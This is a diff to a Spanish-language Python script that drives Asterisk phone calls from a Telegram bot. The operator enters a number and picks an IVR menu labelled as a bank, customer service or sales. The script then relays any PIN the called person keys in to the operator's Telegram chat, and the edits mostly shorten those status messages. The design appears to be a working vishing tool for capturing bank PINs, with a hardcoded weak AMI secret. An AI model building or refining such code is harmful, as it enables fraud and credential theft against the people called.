@@ -12,12 +12,12 @@ AUTHORIZED_CHAT_IDS = [428655938]  # Chat ID autorizado para recibir eventos
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-
 IVR_OPTIONS = {
     "1": {"context": "bank_credit", "description": "Banco 🏦"},
     "2": {"context": "customer_service", "description": "Cliente 📞"},
     "3": {"context": "sales", "description": "Ventas 🛒"},
 }
+
 # Diccionario para manejar datos temporales del usuario
 user_data = {}
 
@@ -29,23 +29,14 @@ manager = Manager(
     secret='admin'
 )
 
-
-# ====== CLASES DE UTILIDAD ======
-
 class Params(BaseModel):
     channel: str
     ivr: str
-
-
-# ====== FUNCIONES PARA TELEGRAM ======
 
 async def send_telegram_message(chat_id: int, message: str):
     """Enviar un mensaje a Telegram."""
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     await application.bot.send_message(chat_id=chat_id, text=message)
-
-
-# ====== FUNCIONES PARA ASTERISK ======
 
 async def initiate_call(params: Params, chat_id: int):
     """Iniciar una llamada a través del AMI de Asterisk."""
@@ -61,14 +52,13 @@ async def initiate_call(params: Params, chat_id: int):
     }
     try:
         response = await manager.send_action(originate_action)
-        message = f"Inicio de llamada: {response.get('Message')}"
+        message = f"✅ Llamada iniciada"
         logger.info(message)
         await send_telegram_message(chat_id, message)
     except Exception as e:
-        error_message = f"Error al iniciar llamada: {e}"
+        error_message = f"❌ Error: {e}"
         logger.error(error_message)
         await send_telegram_message(chat_id, error_message)
-
 
 async def hangup_call(channel: str, chat_id: int):
     """Colgar una llamada activa."""
@@ -78,60 +68,52 @@ async def hangup_call(channel: str, chat_id: int):
     }
     try:
         response = await manager.send_action(hangup_action)
-        message = f"Llamada colgada: {response.get('Message')}"
+        message = f"📴 Llamada finalizada"
         logger.info(message)
         await send_telegram_message(chat_id, message)
     except Exception as e:
-        error_message = f"Error al colgar la llamada: {e}"
+        error_message = f"❌ Error al colgar: {e}"
         logger.error(error_message)
         await send_telegram_message(chat_id, error_message)
-
 
 async def handle_user_event(manager, event):
     """Manejar eventos clave durante la llamada."""
     event_type = event.Event
     channel = event.get('Channel')
-
-    # Inicializamos la variable `message` como None
     message = None
 
     if event_type == 'OriginateResponse' and event.get('Response') == 'Success':
-        message = f"Llamada iniciada en canal {channel}."
+        message = f"📞 Llamada conectada"
         logger.info(message)
-        # Registrar el canal inicial
         for chat_id in AUTHORIZED_CHAT_IDS:
             user_data[chat_id]['channel'] = channel
     elif event_type == 'Newstate':
         state = event.get('ChannelStateDesc')
-        if state == 'Ringing' or state == 'Up':
-            message = f"Llamada está en estado {state} en canal {channel}."
-            logger.info(message)
-            # Actualizar el canal único
-            for chat_id in AUTHORIZED_CHAT_IDS:
-                user_data[chat_id]['channel'] = channel
+        if state == 'Ringing':
+            message = f"🔔 Llamando..."
+        elif state == 'Up':
+            message = f"✅ En llamada"
+        logger.info(message)
+        for chat_id in AUTHORIZED_CHAT_IDS:
+            user_data[chat_id]['channel'] = channel
     elif event_type == 'VarSet' and event.get('Variable') == 'pin':
         pin_value = event.get('Value')
         if pin_value:
-            message = f"PIN ingresado: {pin_value} en canal {channel}."
+            message = f"🔑 PIN: {pin_value}"
             logger.info(message)
     elif event_type == 'Hangup':
-        message = f"Llamada colgada en canal {channel}."
+        message = f"📴 Llamada terminada"
         logger.info(message)
-        # Reiniciar el estado del usuario
         for chat_id in AUTHORIZED_CHAT_IDS:
             user_data[chat_id] = {'step': 'idle'}
-            user_data[chat_id].pop('channel', None)  # Eliminar el canal
+            user_data[chat_id].pop('channel', None)
 
-    # Si `message` tiene un valor, enviarlo a Telegram
     if message:
         for chat_id in AUTHORIZED_CHAT_IDS:
             try:
                 await send_telegram_message(chat_id, message)
             except Exception as e:
-                logger.error(f"Error al enviar mensaje a Telegram: {e}")
-
-
-# ====== CICLO PRINCIPAL PARA EL MANAGER ======
+                logger.error(f"Error al enviar mensaje: {e}")
 
 async def main_manager():
     """Mantener la conexión persistente con el AMI de Asterisk."""
@@ -139,13 +121,11 @@ async def main_manager():
         await manager.connect()
         logger.info("Conexión establecida con Asterisk AMI.")
 
-        # Registrar eventos de Asterisk
         manager.register_event('OriginateResponse', lambda m, e: asyncio.create_task(handle_user_event(m, e)))
         manager.register_event('Newstate', lambda m, e: asyncio.create_task(handle_user_event(m, e)))
         manager.register_event('VarSet', lambda m, e: asyncio.create_task(handle_user_event(m, e)))
         manager.register_event('Hangup', lambda m, e: asyncio.create_task(handle_user_event(m, e)))
 
-        # Mantener el loop escuchando eventos
         while True:
             await asyncio.sleep(1)
     except Exception as e:
@@ -154,18 +134,14 @@ async def main_manager():
         await manager.close()
         logger.info("Conexión cerrada con Asterisk AMI.")
 
-
-# ====== FUNCIONES DEL BOT ======
-
 async def start_call(update, context):
     """Iniciar el proceso de llamada."""
     chat_id = update.effective_chat.id
     if chat_id in AUTHORIZED_CHAT_IDS and user_data.get(chat_id, {}).get('step', 'idle') == 'idle':
-        await send_telegram_message(chat_id, "Por favor, ingresa el número de teléfono:")
+        await send_telegram_message(chat_id, "📱 Ingresa el número:")
         user_data[chat_id] = {'step': 'phone'}
     else:
-        await send_telegram_message(chat_id, "Ya hay una llamada en proceso o no tienes permisos.")
-
+        await send_telegram_message(chat_id, "⚠️ Llamada en curso o sin permisos")
 
 async def hangup(update, context):
     """Colgar la llamada activa."""
@@ -175,14 +151,13 @@ async def hangup(update, context):
         await hangup_call(channel, chat_id)
         user_data[chat_id] = {'step': 'idle'}
     else:
-        await send_telegram_message(chat_id, "No hay una llamada activa para colgar.")
-
+        await send_telegram_message(chat_id, "❌ No hay llamada activa")
 
 async def handle_message(update, context):
     """Procesar mensajes del usuario."""
     chat_id = update.effective_chat.id
     if chat_id not in user_data:
-        await send_telegram_message(chat_id, "Por favor, usa /call para comenzar.")
+        await send_telegram_message(chat_id, "📞 Usa /call para iniciar")
         return
 
     step = user_data[chat_id].get('step')
@@ -195,7 +170,7 @@ async def handle_message(update, context):
 
         user_data[chat_id]['channel'] = channel
         user_data[chat_id]['step'] = 'ivr'
-        options_text = "Elige una opción:\n" + "\n".join(
+        options_text = "🔍 Selecciona:\n" + "\n".join(
             [f"{key}. {value['description']}" for key, value in IVR_OPTIONS.items()]
         )
         await send_telegram_message(chat_id, options_text)
@@ -204,13 +179,10 @@ async def handle_message(update, context):
         if ivr_choice in IVR_OPTIONS:
             ivr_context = IVR_OPTIONS[ivr_choice]["context"]
             params = Params(channel=user_data[chat_id]['channel'], ivr=ivr_context)
-            await send_telegram_message(chat_id, f"📞 Llamando a: {user_data[chat_id]['channel']} con IVR: {IVR_OPTIONS[ivr_choice]['description']}...")
+            await send_telegram_message(chat_id, f"📞 Llamando... {IVR_OPTIONS[ivr_choice]['description']}")
             await initiate_call(params, chat_id)
         else:
-            await send_telegram_message(chat_id, "⚠️ Opción inválida.")
-
-
-# ====== CONFIGURAR Y EJECUTAR EL BOT ======
+            await send_telegram_message(chat_id, "⚠️ Opción inválida")
 
 def setup_bot():
     """Configurar y ejecutar el bot de Telegram."""
@@ -220,16 +192,13 @@ def setup_bot():
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     return application
 
-
 def main():
     """Correr el bot y el loop principal."""
     application = setup_bot()
     loop = asyncio.get_event_loop()
 
-    # Correr el bot y la conexión AMI en paralelo
     loop.create_task(main_manager())
     application.run_polling()
-
 
 if __name__ == "__main__":
     main()
